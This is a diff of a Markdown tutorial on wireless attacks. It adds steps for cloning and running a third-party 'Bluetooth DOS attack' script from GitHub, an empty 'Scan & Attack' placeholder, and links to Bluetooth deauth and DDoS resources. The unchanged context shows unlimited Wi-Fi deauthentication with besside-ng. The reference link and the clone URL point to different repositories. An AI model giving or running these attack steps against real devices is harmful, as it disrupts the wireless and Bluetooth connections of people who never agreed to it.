@@ -87,7 +87,6 @@ besside-ng -c "_" wlan0mon
 ```
 Here, if we want to attack all then don't mention BSSID & station of any client. Also, here `--deauth 0` means unlimited attack and we can even change it to `10` or `100` also.  
 <br> 
-<br>
 
 
 #### Step 5 : Stop/closig the setup (NOT REQUIRED)
@@ -135,11 +134,52 @@ So, now the Bluetooth must be activated properly or can also refer to this [YouT
 <br>
 
 
-#### Step 2 :  
-asdf
+#### Step 2 (METHOD - 1) : Software Cloning from GitHub repo
+Follow the below commands to get the copy of 'DOS attack' software : ([reference](https://github.com/crypt0b0y/BLUETOOTH-DOS-ATTACK-SCRIPT) github link)
+```
+sudo apt update
+sudo apt install python3
+sudo git clone https://github.com/jieggiI/BLUETOOTH-DOS-ATTACK-SCRIPT.git
+cd BLUETOOTH-DOS-ATTACK-SCRIPT/
+python3 Bluetooth-DOS-Attack.py
+```
+Here, the `git clone` command may ask for your 'username' & 'password' of GitHub account.  
+<br>
+<br>
+
+
+#### Step 2 (METHOD - 2) : Scanning & Attack device
+Scan & Attack on device. . . .
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### Can refer some some links : 
+gg-deauth bluetooth
+- https://hackmag.com/security/bluetooth-ddos/
+- https://github.com/its0x08/blue-deauth
+- https://null-byte.wonderhowto.com/how-to/bt-recon-snoop-bluetooth-devices-using-kali-linux-0165049/
+- https://www.youtube.com/watch?v=pHqd1PnOk_4
+- https://www.youtube.com/watch?v=IE_SLohDce0
+
+
+
+---
+-- create the clear .md file also. . . .
 
 
 
